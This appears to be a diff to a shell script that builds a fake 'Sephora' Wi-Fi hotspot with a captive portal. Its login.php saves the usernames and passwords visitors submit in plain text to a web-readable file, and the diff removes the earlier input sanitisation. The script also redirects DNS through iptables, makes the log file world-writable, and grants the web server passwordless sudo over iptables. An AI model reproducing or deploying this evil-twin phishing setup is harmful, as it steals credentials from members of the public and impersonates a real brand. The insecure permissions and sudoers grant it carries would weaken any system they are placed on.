@@ -32,6 +32,10 @@ iptables --table nat --delete-chain
 iptables -t nat -A POSTROUTING -o $ETH_IFACE -j MASQUERADE
 iptables -A FORWARD -i $WIFI_IFACE -o $ETH_IFACE -m state --state RELATED,ESTABLISHED -j ACCEPT
 iptables -A FORWARD -i $ETH_IFACE -o $WIFI_IFACE -j ACCEPT
+#iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j DNAT --to 8.8.8.8
+#iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j DNAT --to 8.8.8.8
+#iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80
+#iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 443
 
 # Ensure iptables rules persist after reboot (better method)
 apt install -y iptables-persistent
@@ -108,27 +112,42 @@ cat <<EOF > /var/www/html/hotspot-detect.html
 </body>
 </html>
 EOF
-cat <<EOF > /var/www/html/login.php
+
+#iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j DNAT --to 8.8.8.8
+#iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j DNAT --to 8.8.8.8
+cat <<'EOF' > /var/www/html/login.php
 <?php
-// Capture the credentials and append them to a log file
-$username = isset($_POST['username']) ? $_POST['username'] : 'N/A';
-$password = isset($_POST['password']) ? $_POST['password'] : 'N/A';
+$ip = $_SERVER['REMOTE_ADDR'];
+file_put_contents("/var/www/html/logins.txt", $_POST['username'] . " : " . $_POST['password'] . "\n", FILE_APPEND);
 
-// Sanitize the inputs to prevent injection attacks
-$clean_username = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
-$clean_password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');
+// Autoriser l'IP du client à accéder à Internet
+//exec("sudo iptables -t nat -I PREROUTING -s $ip -j ACCEPT");
+//exec("sudo iptables -I FORWARD -s $ip -j ACCEPT");
 
-// Log the sanitized credentials
-file_put_contents("/var/www/html/logins.txt", "$clean_username : $clean_password\n", FILE_APPEND);
+// Appliquer les règles DNS pour l'utilisateur connecté
+exec("sudo iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j DNAT --to 8.8.8.8");
+exec("sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j DNAT --to 8.8.8.8");
 
-// Redirect to Sephora
-header("Location: https://www.sephora.com");
+// Afficher un message de confirmation
+echo "<html><head><title>Connexion réussie</title></head><body>";
+echo "<h2>Connexion réussie !</h2>";
+echo "<p>Vous êtes maintenant connecté à Internet.</p>";
+//echo "<script>setTimeout(function(){ window.location.href = 'http://google.com'; }, 3000);</script>";
+echo "</body></html>";
+
 exit();
 ?>
 EOF
 
+touch /var/www/html/logins.txt
+chown www-data:www-data /var/www/html/logins.txt
+chmod 666 /var/www/html/logins.txt
+chmod 777 /var/www/html/login.php
+echo "www-data ALL=(ALL) NOPASSWD: /usr/sbin/iptables" >> /etc/sudoers
+
 echo "[+] Configuration Apache pour HTTPS..."
 a2enmod ssl
+
 cat <<EOF > /etc/apache2/sites-available/captive.conf
 <VirtualHost *:443>
     ServerAdmin admin@sephoraWifi.com
